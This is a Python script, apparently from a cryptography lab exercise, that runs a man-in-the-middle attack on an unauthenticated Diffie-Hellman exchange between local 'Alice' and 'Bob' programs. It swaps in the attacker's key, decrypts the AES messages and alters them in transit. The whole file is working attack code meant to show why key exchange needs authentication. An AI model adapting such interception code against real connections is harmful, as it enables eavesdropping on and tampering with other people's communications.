# Attacker.py
import socket
import threading
import pickle
import random
import hashlib
import os                      # ← 新增
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
# 删掉 get_random_bytes 的导入
from para import p, g

class Attacker:
    def __init__(self):
        self.m = None
        self.M = None
        self.A_alice = None
        self.B_bob = None
        self.key_alice = None
        self.key_bob = None
        self.mode = None
        self.alice_conn = None
        self.bob_conn = None

    def generate_attacker_keys(self):
        self.m = random.randint(1, p - 2)
        self.M = pow(g, self.m, p)
        print(f"[Attacker] 生成密钥对: 私钥 m={self.m}, 公钥 M={self.M}")

    def calculate_keys(self):
        if self.A_alice and self.B_bob and self.m:
            self.key_alice = pow(self.A_alice, self.m, p)
            self.key_bob = pow(self.B_bob, self.m, p)
            self.key_alice = hashlib.sha256(str(self.key_alice).encode()).digest()
            self.key_bob = hashlib.sha256(str(self.key_bob).encode()).digest()
            print(f"[Attacker] 计算共享密钥:")
            print(f"  - 与Alice: {self.key_alice.hex()}")
            print(f"  - 与Bob:   {self.key_bob.hex()}")

    # ----------------- Alice 方向 -----------------
    def handle_alice(self, alice_conn):
        self.alice_conn = alice_conn
        while True:
            try:
                data = alice_conn.recv(1024)
                if not data:
                    break
                msg = pickle.loads(data)

                if 'public_key' in msg:
                    if self.mode is None:
                        self.mode = msg['mode']
                        print(f"[Attacker] 检测到模式: {self.mode}")
                    if self.mode == 2:
                        self.A_alice = msg['public_key']
                        print(f"[Attacker] 收到Alice的公钥: A={self.A_alice}")
                        if self.m is None:
                            self.generate_attacker_keys()
                        response = {'public_key': self.M, 'mode': self.mode}
                        if 'password' in msg:
                            response['password'] = msg['password']
                        alice_conn.send(pickle.dumps(response))
                        print("[Attacker] 发送M给Alice (冒充Bob)")
                    else:
                        if self.bob_conn:
                            self.bob_conn.send(data)

                elif 'ciphertext' in msg and 'iv' in msg:
                    if self.mode == 2:
                        if not self.key_alice:
                            self.calculate_keys()
                        iv = msg['iv']
                        ciphertext = msg['ciphertext']
                        cipher = AES.new(self.key_alice, AES.MODE_CBC, iv=iv)
                        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
                        print(f"[Attacker] 解密Alice消息: {plaintext.decode()}")
                        modified_msg = "ATTACKER: " + plaintext.decode()
                        print(f"[Attacker] 修改消息为: {modified_msg}")
                        new_iv = os.urandom(16)                      # ← 改动
                        new_cipher = AES.new(self.key_bob, AES.MODE_CBC, iv=new_iv)
                        new_ciphertext = new_cipher.encrypt(pad(modified_msg.encode(), AES.block_size))
                        if self.bob_conn:
                            self.bob_conn.send(pickle.dumps({'iv': new_iv, 'ciphertext': new_ciphertext}))
                            print("[Attacker] 转发修改后的消息给Bob")
                    else:
                        if self.bob_conn:
                            self.bob_conn.send(data)
            except Exception as e:
                print(f"[Attacker] Alice连接错误: {e}")
                break

    # ----------------- Bob 方向 -----------------
    def handle_bob(self, bob_conn):
        self.bob_conn = bob_conn
        while True:
            try:
                data = bob_conn.recv(1024)
                if not data:
                    break
                msg = pickle.loads(data)

                if 'public_key' in msg:
                    if self.mode is None:
                        self.mode = msg['mode']
                    if self.mode == 2:
                        self.B_bob = msg['public_key']
                        print(f"[Attacker] 收到Bob的公钥: B={self.B_bob}")
                        if self.m is None:
                            self.generate_attacker_keys()
                        response = {'public_key': self.M, 'mode': self.mode}
                        if 'password' in msg:
                            response['password'] = msg['password']
                        bob_conn.send(pickle.dumps(response))
                        print("[Attacker] 发送M给Bob (冒充Alice)")
                        self.calculate_keys()
                    else:
                        if self.alice_conn:
                            self.alice_conn.send(data)

                elif 'ciphertext' in msg and 'iv' in msg:
                    if self.mode == 2:
                        if not self.key_bob:
                            self.calculate_keys()
                        iv = msg['iv']
                        ciphertext = msg['ciphertext']
                        cipher = AES.new(self.key_bob, AES.MODE_CBC, iv=iv)
                        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
                        print(f"[Attacker] 解密Bob消息: {plaintext.decode()}")
                        new_iv = os.urandom(16)                      # ← 改动
                        new_cipher = AES.new(self.key_alice, AES.MODE_CBC, iv=new_iv)
                        new_ciphertext = new_cipher.encrypt(pad(plaintext, AES.block_size))
                        if self.alice_conn:
                            self.alice_conn.send(pickle.dumps({'iv': new_iv, 'ciphertext': new_ciphertext}))
                            print("[Attacker] 转发消息给Alice")
                    else:
                        if self.alice_conn:
                            self.alice_conn.send(data)
            except Exception as e:
                print(f"[Attacker] Bob连接错误: {e}")
                break

    # ----------------- 启动 -----------------
    def start(self):
        alice_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        alice_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            alice_server.bind(('localhost', 9999))
            alice_server.listen(1)
            print("Attacker正在监听Alice连接 (端口9999)...")
        except OSError as e:
            print(f"❌ 绑定端口9999失败: {e}")
            return

        bob_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            bob_client.connect(('localhost', 8888))
            print("Attacker已连接Bob (端口8888)")
        except ConnectionRefusedError:
            print("❌ 连接Bob失败: Bob服务未启动或端口错误")
            return
        except Exception as e:
            print(f"❌ 连接Bob时出错: {e}")
            return

        print("等待Alice连接...")
        try:
            alice_conn, _ = alice_server.accept()
            print("Attacker收到Alice连接")
        except Exception as e:
            print(f"❌ 接受Alice连接时出错: {e}")
            return

        threading.Thread(target=self.handle_alice, args=(alice_conn,), daemon=True).start()
        threading.Thread(target=self.handle_bob, args=(bob_client,), daemon=True).start()

        print("✅ MITM攻击已激活! 按Enter退出...")
        try:
            input()
        except:
            pass

if __name__ == "__main__":
    Attacker().start()